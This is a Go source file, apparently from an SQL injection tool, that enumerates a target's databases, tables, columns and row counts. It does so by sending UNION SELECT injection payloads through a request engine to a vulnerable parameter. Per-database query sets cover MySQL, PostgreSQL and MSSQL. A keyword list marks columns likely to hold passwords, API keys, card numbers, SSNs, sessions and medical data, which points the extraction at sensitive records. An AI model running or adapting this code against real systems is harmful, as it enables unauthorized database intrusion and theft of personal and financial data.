package crawl

import (
	"fmt"
	"strings"
	"hackit/sqli/go/utils"
)

// SchemaCrawler handles deep schema discovery
type SchemaCrawler struct {
	engine EngineInterface
	log    *utils.Logger
}

// SchemaQuery holds DBMS-specific schema queries
type SchemaQuery struct {
	Databases string
	Tables    string
	Columns   string
	Collation string
	RowCount  string
	TableInfo string
}

func NewSchemaCrawler(e EngineInterface) *SchemaCrawler {
	return &SchemaCrawler{engine: e, log: e.GetLogger()}
}

func (sc *SchemaCrawler) schemaQueries(dbms string) *SchemaQuery {
	// Return DBMS-specific schema queries
	switch {
	case strings.Contains(dbms, "MySQL"), strings.Contains(dbms, "MariaDB"):
		return &SchemaQuery{
			Databases: "SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA",
			Tables:    "SELECT TABLE_NAME, ENGINE, TABLE_COLLATION, IFNULL(TABLE_ROWS,0) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s' AND TABLE_TYPE='BASE TABLE'",
			Columns:   "SELECT COLUMN_NAME, COLUMN_TYPE, IS_NULLABLE, IFNULL(COLUMN_DEFAULT,''), IFNULL(COLUMN_COMMENT,''), IFNULL(CHARACTER_MAXIMUM_LENGTH,0), COLUMN_KEY, EXTRA FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='%s' AND TABLE_NAME='%s' ORDER BY ORDINAL_POSITION",
			Collation: "SELECT DEFAULT_CHARACTER_SET_NAME, DEFAULT_COLLATION_NAME FROM INFORMATION_SCHEMA.SCHEMATA WHERE SCHEMA_NAME='%s'",
			RowCount:  "SELECT COUNT(*) FROM `%s`.`%s`",
			TableInfo: "SELECT ENGINE, TABLE_COLLATION, IFNULL(TABLE_ROWS,0), IFNULL(DATA_LENGTH,0), IFNULL(INDEX_LENGTH,0) FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s' AND TABLE_NAME='%s'",
		}
	case strings.Contains(dbms, "PostgreSQL"):
		return &SchemaQuery{
			Databases: "SELECT datname FROM pg_database WHERE datistemplate=false",
			Tables:    "SELECT tablename, 'Heap', '' FROM pg_tables WHERE schemaname NOT IN ('pg_catalog','information_schema') AND schemaname='public'",
			Columns:   "SELECT column_name, data_type||COALESCE('('||character_maximum_length||')',''), is_nullable, COALESCE(column_default,''), '' FROM information_schema.columns WHERE table_schema='public' AND table_name='%s' ORDER BY ordinal_position",
			RowCount:  "SELECT reltuples::bigint FROM pg_class WHERE relname='%s'",
			TableInfo: "SELECT 'Heap', '', reltuples::bigint, pg_total_relation_size(relid), 0 FROM pg_catalog.pg_statio_user_tables WHERE relname='%s'",
		}
	case strings.Contains(dbms, "MSSQL"):
		return &SchemaQuery{
			Databases: "SELECT name FROM sys.databases WHERE name NOT IN ('master','tempdb','model','msdb')",
			Tables:    "SELECT t.name, 'N/A', '' FROM sys.tables t WHERE (SELECT SCHEMA_NAME(t.schema_id))='dbo'",
			Columns:   "SELECT c.name, tp.name+COALESCE('('+CAST(c.max_length AS VARCHAR)+')',''), CASE WHEN c.is_nullable=1 THEN 'YES' ELSE 'NO' END, COALESCE(OBJECT_DEFINITION(c.default_object_id),''), '' FROM sys.columns c JOIN sys.types tp ON c.system_type_id=tp.system_type_id WHERE c.object_id=OBJECT_ID('%s') ORDER BY c.column_id",
			RowCount:  "SELECT SUM(row_count) FROM sys.dm_db_partition_stats WHERE object_id=OBJECT_ID('%s') AND index_id<2",
			TableInfo: "SELECT 'N/A', '', 0, 0, 0",
		}
	}
	// Fallback to MySQL syntax
	return &SchemaQuery{
		Databases: "SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA",
		Tables:    "SELECT TABLE_NAME, '', '' FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='%s' AND TABLE_TYPE='BASE TABLE'",
		Columns:   "SELECT COLUMN_NAME, COLUMN_TYPE, IFNULL(IS_NULLABLE,'NO'), IFNULL(COLUMN_DEFAULT,''), IFNULL(COLUMN_COMMENT,''), IFNULL(CHARACTER_MAXIMUM_LENGTH,0), /*key*/'', '' FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA='%s' AND TABLE_NAME='%s' ORDER BY ORDINAL_POSITION",
		RowCount:  "SELECT COUNT(*) FROM `%s`.`%s`",
		TableInfo: "SELECT '', '', 0, 0, 0",
	}
}

// DiscoverDatabases discovers all databases on the target
func (sc *SchemaCrawler) DiscoverDatabases(param, dbms string) []string {
	queries := sc.schemaQueries(dbms)
	return sc.extractList(param, queries.Databases, "database")
}

// CrawlTables discovers all tables in a database
func (sc *SchemaCrawler) CrawlTables(param, dbms, database string) []string {
	queries := sc.schemaQueries(dbms)
	query := fmt.Sprintf(queries.Tables, database)
	return sc.extractList(param, query, "table")
}

// CrawlTableDetail extracts full table information
func (sc *SchemaCrawler) CrawlTableDetail(param, dbms, database, table string) *TableInfo {
	queries := sc.schemaQueries(dbms)

	info := &TableInfo{
		Name:      table,
		Columns:   []ColumnInfo{},
	}

	// Get table metadata
	metaQuery := fmt.Sprintf(queries.TableInfo, database, table)
	metaResults := sc.extractData(param, metaQuery)
	if len(metaResults) > 0 {
		info.Engine = safeGet(metaResults[0], 0)
		info.Collation = safeGet(metaResults[0], 1)
	}

	// Get columns
	colQuery := fmt.Sprintf(queries.Columns, database, table)
	colResults := sc.extractData(param, colQuery)

	for _, row := range colResults {
		col := ColumnInfo{
			Name:       safeGet(row, 0),
			Type:       safeGet(row, 1),
			Nullable:   strings.ToUpper(safeGet(row, 2)) == "YES",
			Default:    safeGet(row, 3),
			Comment:    safeGet(row, 4),
			Length:     safeGet(row, 5),
		}

		// Detect PK
		key := safeGet(row, 6)
		col.IsPK = key == "PRI" || key == "PK"

		// Detect identity/auto-increment
		extra := safeGet(row, 7)
		col.IsIdentity = strings.Contains(strings.ToLower(extra), "auto_increment") ||
			strings.Contains(strings.ToLower(extra), "identity")

		// Mark sensitive columns
		col.IsSensitive = sc.isSensitiveColumn(col.Name)

		info.Columns = append(info.Columns, col)
	}

	// Get row count
	countQuery := fmt.Sprintf(queries.RowCount, database, table)
	countResults := sc.extractData(param, countQuery)
	if len(countResults) > 0 {
		fmt.Sscanf(safeGet(countResults[0], 0), "%d", &info.RowCount)
	}

	return info
}

func (sc *SchemaCrawler) extractList(param, query, label string) []string {
	payload := fmt.Sprintf("' UNION SELECT %s-- -", query)
	// Try to wrap in group_concat for single-row extraction
	payload = fmt.Sprintf("' UNION SELECT GROUP_CONCAT(%s SEPARATOR 0x7e)-- -", query)

	body, _, _, err := sc.engine.Request(payload, param)
	if err != nil {
		return nil
	}

	return sc.parseList(body)
}

func (sc *SchemaCrawler) extractData(param, query string) [][]string {
	payload := fmt.Sprintf("' UNION SELECT %s-- -", query)
	body, _, _, err := sc.engine.Request(payload, param)
	if err != nil {
		return nil
	}
	return sc.parseData(body)
}

func (sc *SchemaCrawler) parseList(body string) []string {
	// Extract data between response markers
	start := strings.Index(body, "~")
	if start < 0 {
		// Try to find data in response
		start = strings.Index(body, "<")
		if start < 0 {
			start = 0
		}
	}
	end := strings.LastIndex(body, ">")
	if end < start {
		end = len(body)
	}

	content := body
	if start > 0 && end > start {
		content = body[start:end]
	}

	// Split by delimiter
	items := strings.Split(content, "~")
	var result []string
	for _, item := range items {
		item = strings.TrimSpace(item)
		if len(item) > 0 && len(item) < 200 {
			result = append(result, item)
		}
	}
	return result
}

func (sc *SchemaCrawler) parseData(body string) [][]string {
	var result [][]string
	lines := strings.Split(body, "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if len(line) == 0 || strings.HasPrefix(line, "<") || strings.HasPrefix(line, "<!") {
			continue
		}
		// Try splitting by comma or tab
		parts := strings.Split(line, "\t")
		if len(parts) < 2 {
			parts = strings.Split(line, ",")
		}
		if len(parts) >= 1 {
			var clean []string
			for _, p := range parts {
				p = strings.TrimSpace(p)
				p = strings.Trim(p, "'\"")
				if len(p) > 0 {
					clean = append(clean, p)
				}
			}
			if len(clean) > 0 {
				result = append(result, clean)
			}
		}
	}
	return result
}

func (sc *SchemaCrawler) isSensitiveColumn(name string) bool {
	lower := strings.ToLower(name)
	sensitivePatterns := []string{
		"password", "pass", "pwd", "hash", "salt",
		"secret", "token", "auth", "credential", "key",
		"api_key", "apikey", "api_secret", "apisecret",
		"access_key", "accesskey", "secret_key", "secretkey",
		"email", "mail", "phone", "mobile", "tel",
		"ssn", "social", "security", "national_id",
		"credit", "card", "cvv", "cvc", "cc_number",
		"bank", "account", "iban", "swift", "bic",
		"address", "street", "city", "zip", "postcode",
		"birth", "dob", "birthday", "birth_date",
		"pin", "otp", "tfa", "mfa", "2fa",
		"cookie", "session", "jwt", "bearer",
		"license", "driver", "passport",
		"salary", "income", "wage", "bonus",
		"diagnosis", "medical", "health", "patient",
		"classification", "clearance", "level",
		"backup", "dump", "snapshot",
		"connection_string", "connstr", "dsn",
		"private", "public_key", "certificate",
		"aws", "azure", "gcp", "cloud",
		"firebase", "stripe", "paypal", "payment",
	}

	for _, p := range sensitivePatterns {
		if strings.Contains(lower, p) {
			return true
		}
	}
	return false
}

func safeGet(row []string, idx int) string {
	if idx < len(row) {
		return row[idx]
	}
	return ""
}
